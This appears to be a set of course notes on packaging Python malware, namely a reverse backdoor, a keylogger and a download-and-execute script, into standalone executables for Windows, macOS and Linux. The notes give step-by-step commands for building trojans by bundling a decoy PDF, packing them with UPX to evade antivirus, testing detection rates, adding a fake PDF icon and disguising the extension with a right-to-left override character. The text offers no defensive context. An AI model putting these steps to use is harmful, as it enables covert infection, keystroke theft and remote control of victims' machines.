# Packaging

Compile in Windows

Go to python.org, download python 2.7 for windows 

C:\Python27\python.exe -m pip install pyinstaller

C:\Python27\Scripts\pyinstaller.exe reverse_backdoor.py --onefile --noconsole


Install pyinstaller in Linux

Go to python.org, download python 2.7 for windows 

cd Download/ wine msiexec /i python-2.7.14.msi

cd ..

cd .wine/drive_c/Python27

wine python.exe -m pip install pyinstaller


Compile keylogger from linux

cd PycharmProjects/keylogger

wine /root/.wine/drive_c/Python27/python.exe -m pip install pynput

wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe zlogger.py --onefile --noconsole


Compile more than 2 program from linux

cd download_and_execute

wine /root/.wine/drive_c/Python7/python.exe -m pip uninstall requests

wine /root/.wine/drive_c/Python27/python.exe -m pip install requests==2.5.1

wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile --noconsole download_and_execute.py


Creating trojan (adding 2 program) from linux

cd reverse_backdoor

edit the file path in reverse_backdoor

wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data "/root/Downloads/sample.pdf;." --onefile --noconsole reverse_backdoor.py

Bypassing antivirus with upx

go to https://github.com/upx/upx/releases/tag/

Download latest version and extract it

cd /opt/upx

./upx /root/PycharmProjects/reverse_backdoor/dist/reverse_backdoor.exe -o compressed_backdoor.exe

check file with nodistribute.com



Adding icons to program

Go to iconfinder.com, download png(512x512)

Go to easyicon.net, convert png to ico file(microsoft, 512x512)

Go to executable folder

wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data "/root/Downloads/sample.pdf;." --onefile --noconsole --icon /root/Downloads/pdf.ico reverse_backdoor.py


Spoofing file extension[convert pdf to exe file]

go to https://unicode.flopp.net/c/202E for right-to-left override, copy character

edit in executable file, for example fdp.exe


Convert python to osx executable

osx comes with python

download get-pip file from https://bootstrap.pypa.io

cd Downloads

sudo python get-pip.py

sudo pip install pyinstaller

pyinstaller --onefile --noconsole --icon pdf.icns download_and_execute.py

Convert python program to linux

pip install pyinstaller

pyinstaller --onefile --noconsole reverse_backdoor.py











